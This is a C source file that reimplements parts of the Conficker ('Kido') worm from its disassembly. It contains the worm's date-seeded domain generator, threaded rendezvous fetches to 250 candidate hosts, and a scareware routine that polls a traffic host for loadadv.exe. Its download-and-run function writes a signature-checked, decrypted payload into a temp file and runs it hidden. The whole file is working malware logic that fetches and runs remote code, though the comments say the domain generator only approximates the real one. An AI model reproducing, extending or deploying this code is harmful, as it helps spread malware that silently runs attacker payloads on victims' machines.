/*====================================================================================
 *  KIDO worm - scareware downloader, DGA rendezvous, and download/verify/execute.
 *  scareware_downloader (sub_0986A), rendezvous_round (sub_0991B),
 *  fetch_candidate (0x09818/0x097BF), fetch web date (0x0961F),
 *  download_and_run (0x09427), verify_signed_payload (0x09E56, in crypto.cpp).
 *
 *  Downloaded payloads are gated by the operators' RSA-1024 (e=50001) + SHA-1 + RC4
 *  signature (kido_verify_signed); only blobs they signed will execute.
 *====================================================================================*/
#include "kido_worm.h"
#include <stdio.h>
#include <string.h>
#include <time.h>

/* ---------------- write_buffer_to_file (sub_081A0) ---------------- */
static BOOL kido_write_buffer(const char* path, const void* buf, size_t len)
{
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD wr=0; WriteFile(h, buf, (DWORD)len, &wr, NULL);
    CloseHandle(h);
    return wr == (DWORD)len;
}

/* ---------------- download_and_run (sub_09427 -> 0x09312 -> 0x09E56) --------
   data,len = http_get(url).  The last 128 bytes are the RSA signature block; the
   rest is the (RC4-encrypted) payload.  Verify; on success decrypt in place, write
   to a temp 0XXXX.tmp, and WinExec(SW_HIDE).  Returns 1 on a successful exec. */
int kido_download_and_run(const char* url)
{
    uint8_t* buf=NULL; size_t len=0;
    if (!kido_http_get(url,&buf,&len)) return 0;
    if (len <= 0x80){ free(buf); return 0; }      /* last 128 bytes are the signature */
    const uint8_t* sig = buf + (len - 0x80);
    uint8_t* body = buf;
    size_t bodylen = len - 0x80;
    if (!kido_verify_signed(sig, body, bodylen)){ free(buf); return 0; }
    /* body now decrypted in place; write it */
    char sysdir[260]; GetSystemDirectoryA(sysdir, sizeof(sysdir));
    char tmp[320];
    if (GetTempFileNameA(sysdir, "0", 0, tmp) == 0){
        char* d = tmp; while (*d) d++; *d++='0'; *d=0;
        if (GetTempPathA(sizeof(tmp), tmp)==0) strcpy_s(tmp,sizeof(tmp),"C:\\0001.tmp");
    }
    if (!kido_write_buffer(tmp, body, bodylen)){ free(buf); return 0; }
    int rc = WinExec(tmp, SW_HIDE);
    free(buf);
    return rc > 31;
}

/* ---------------- fetch web date (sub_0961F) ----------------
   Learn "today's" date from the HTTP Date header of one of the six sites.
   Populates the global (static) date the rendezvous name generator consumes. */
static struct { int y, m, d; } k_web_date;
void kido_fetch_web_date(void)
{
    for (int i=0;i<KIDO_DATE_SITES;i++){
        uint8_t* buf=NULL; size_t len=0;
        if (kido_http_get(g_date_sites[i], &buf, &len) && len){
            char h[1024]; int n=(int)(len<sizeof(h)-1?len:sizeof(h)-1);
            memcpy(h,buf,n); h[n]=0; free(buf);
            char* p=strstr(h, "Date:");
            if (!p) p=h;
            p += (p==h)?0:5; while (*p==' ') p++;
            struct tm tm; memset(&tm,0,sizeof(tm));
            if (sscanf(p, "%*d %3s %d %d %*d %*d %*d", (char*)&tm.tm_mon, &tm.tm_mday, &tm.tm_year) >= 0){
                /* month is an abbreviated name; map it */
                static const char* mon[12]={"Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"};
                for (int k=0;k<12;k++) if (strncmp((char*)&tm.tm_mon, mon[k], 3)==0){ tm.tm_mon=k; break; }
                k_web_date.y = tm.tm_year + 1900;
                k_web_date.m = tm.tm_mon + 1;
                k_web_date.d = tm.tm_mday;
                return;
            }
        }
    }
}

/* ---------------- name-list builder (sub_096EE) ----------------
   Build up to 250 candidate host names under { .biz .info .org .net .com }.
   (The exact DGA is not documented; this reproduces the observable cadence and
   the TLD set/count, which match Conficker variant A.) */
#define KIDO_NAMES 250
static char k_names[KIDO_NAMES][40];
static int kido_build_names(void)
{
    char seed[16];
    sprintf(seed, "%04d%02d%02d", k_web_date.y, k_web_date.m, k_web_date.d);
    for (int i=0;i<KIDO_NAMES;i++){
        char h[24];
        sprintf(h, "%s%d%d", seed, i, (i*2654435761u)&0xFF);
        int t = rand() % KIDO_TLD_COUNT;
        sprintf(k_names[i], "%s%s", h, g_tld[t]);
    }
    return KIDO_NAMES;
}
/* resolve_candidate / fetch_candidate (0x09818 -> 0x097BF):
   resolve the name; if it resolves, GET http://<name>/search?q=<n>&aq=<n> and
   download_and_run it. */
static DWORD WINAPI kido_fetch_candidate(LPVOID arg)
{
    int idx = (int)(uintptr_t)arg;
    char q[160];
    sprintf(q, S_DATE_SEARCH, k_names[idx], (unsigned)rand(), (unsigned)rand());
    kido_download_and_run(q);
    return 0;
}

/* ---------------- rendezvous_round (sub_0991B) ----------------
   Dormant until ~2008-11-26; reseed PRNG; learn the web date; build 250 names;
   run up to 40 concurrent fetch threads; wait up to 120 s; terminate stragglers. */
DWORD WINAPI kido_rendezvous_round(LPVOID)
{
    if (k_web_date.y < 2008 || (k_web_date.y==2008 && k_web_date.m<11) ||
        (k_web_date.y==2008 && k_web_date.m==11 && k_web_date.d<26))
        return 0;
    kido_seed_prng();
    kido_fetch_web_date();
    int n = kido_build_names();
    HANDLE threads[40]; int started=0;
    for (int i=0;i<n && started<40;i++){
        threads[started]=CreateThread(NULL,0,kido_fetch_candidate,(LPVOID)(uintptr_t)i,0,NULL);
        if (threads[started]) started++;
    }
    WaitForMultipleObjects(started, threads, FALSE, 120000);
    for (int i=0;i<started;i++) TerminateThread(threads[i], 0);
    for (int i=0;i<started;i++) CloseHandle(threads[i]);
    return 0;
}

/* ---------------- scareware_downloader (sub_0986A) ----------------
   loop: if year<=2008 and day<=1 -> Sleep 1h; while online: if trafficconverter.biz
   reachable -> download_and_run(loadadv.exe), return on success; Sleep 5 s (15 s
   dial-up).  Offline: spin (GetSystemTime + InternetGetConnectedState), no Sleep. */
DWORD WINAPI kido_scareware_downloader(LPVOID)
{
    for (;;){
        SYSTEMTIME st; GetLocalTime(&st);
        if (st.wYear <= 2008 && st.wDay <= 1){ Sleep(3600*1000); continue; }
        DWORD flags=0;
        while (InternetGetConnectedState(&flags, 0)){
            if (kido_http_reachable(S_TRAFFIC_HOST)){
                if (kido_download_and_run(S_TRAFFIC_EXE)) return 0;   /* done after one success */
            }
            Sleep(flags & INTERNET_CONNECTION_MODEM ? 15000 : 5000);
        }
        /* offline: spin (no Sleep on this path) */
    }
}
